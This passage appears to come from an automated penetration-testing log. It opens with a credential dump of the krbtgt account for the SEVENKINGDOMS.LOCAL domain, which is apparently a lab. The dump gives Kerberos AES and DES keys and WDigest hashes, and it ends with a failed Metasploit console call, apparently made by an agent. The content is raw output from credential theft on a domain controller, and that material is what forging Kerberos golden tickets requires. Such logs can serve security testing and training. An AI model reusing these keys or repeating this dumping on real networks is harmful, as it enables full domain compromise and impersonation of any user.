    lm  - 0: 9aa518e567547179ef0b40f10cd59d8e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : c2838a2e8514c10a18c561b7e01d5aab

* Primary:Kerberos-Newer-Keys *
    Default Salt : SEVENKINGDOMS.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6ff7196da79188954c60240d5f3931e62565d70683bd7daa90830de6e32c309
      aes128_hmac       (4096) : 7bcb6cf3c6a65b7bd6a6cadd4416600d
      des_cbc_md5       (4096) : 34cb68d594fdda49

* Primary:Kerberos *
    Default Salt : SEVENKINGDOMS.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 34cb68d594fdda49

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  be8a990aef4b55a68dd78d733fd1f4cf
    02  89977b08365d258652ef9b9d8927948a
    03  4c2a3399a2582e966fe5c585eab68fba
    04  be8a990aef4b55a68dd78d733fd1f4cf
    05  89977b08365d258652ef9b9d8927948a
    06  4d7638ea009023de5cdac5b20e90e140
    07  be8a990aef4b55a68dd78d733fd1f4cf
    08  d95f90fa8bf5254fad8cc54d29e8b48f
    09  d95f90fa8bf5254fad8cc54d29e8b48f
    10  f3d019a05ce9a880a0e54bc1ad64867c
    11  b6b35557c264e794813c656cfd2210e9
    12  d95f90fa8bf5254fad8cc54d29e8b48f
    13  5becdfcede5fbe948337f573446afbc3
    14  b6b35557c264e794813c656cfd2210e9
    15  c0b00f2f0a1e6421709ed1a7018ca814
    16  c0b00f2f0a1e64217
... [truncated]
```

## Phase 1: Initial Access & Situational Awareness

### 321. [2025-12-18 07:49:32] `msf_console_execute` ❌

```
Error: MSF Error: true
```

